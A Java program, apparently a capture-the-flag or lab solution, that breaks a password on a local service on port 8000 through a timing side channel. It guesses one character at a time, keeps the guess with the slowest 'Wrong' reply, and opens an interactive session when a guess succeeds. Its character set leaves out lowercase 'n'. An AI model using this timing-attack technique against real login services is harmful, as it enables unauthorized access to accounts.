import java.io.*;
import java.net.Socket;
import java.util.Arrays;
import java.util.Scanner;

public class king {
    public static void main(String[] args) {
        String charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmopqrstuvwxyz0123456789\"'!§$%&/()=?{}^/*+-*#[],;._@<>|";
        try (Socket socket = new Socket("localhost", Integer.parseInt("8000"))) {
            BufferedReader serverReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter serverWriter = new PrintWriter(socket.getOutputStream());
            Scanner keyboard = new Scanner(System.in);

            char[] buffer = new char[2048];
            int read = serverReader.read(buffer);
            String input = new String(buffer, 0, read);
            System.out.print(input);

            String key = keyboard.nextLine();
            serverWriter.write(key + "\n");
            serverWriter.flush();

            read = serverReader.read(buffer);
            input = new String(buffer, 0, read);
            System.out.print(input);

            String acc = "";
            String acc_new = "";
            String acc_temp = "";
            double longest_dur = 0;
            double time = 0.1;
            while (true) {
                for (char c : charset.toCharArray()) {
                    acc_temp = acc + c;
                    serverWriter.write(acc_temp + "\n");
                    serverWriter.flush();
                    read = serverReader.read(buffer);
                    input = new String(buffer, 0, read);
                    if (input.startsWith("Wrong")) {
                        double seconds = Double.parseDouble(input.split("\n")[1].split(" ")[2]);
                        System.out.println("Tried " + acc_temp + " took " + seconds + "ms");
                        if (seconds > longest_dur) {
                            longest_dur = seconds;
                            acc_new = acc_temp;
                        }
                        if (seconds > time + 0.04) {
                            break;
                        }
                    } else {
                        System.out.println("Found password: " + acc_temp);
                        System.out.print(input);
                        while (true) {
                            key = keyboard.nextLine();
                            serverWriter.write(key + "\n");
                            serverWriter.flush();
                            read = serverReader.read(buffer);
                            input = new String(buffer, 0, read);
                            System.out.print(input);
                        }
                    }
                }
                acc = acc_new;
                time += 0.1;
                System.out.println("Longes duration: " + longest_dur);
                System.out.println("Curr time " + time);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
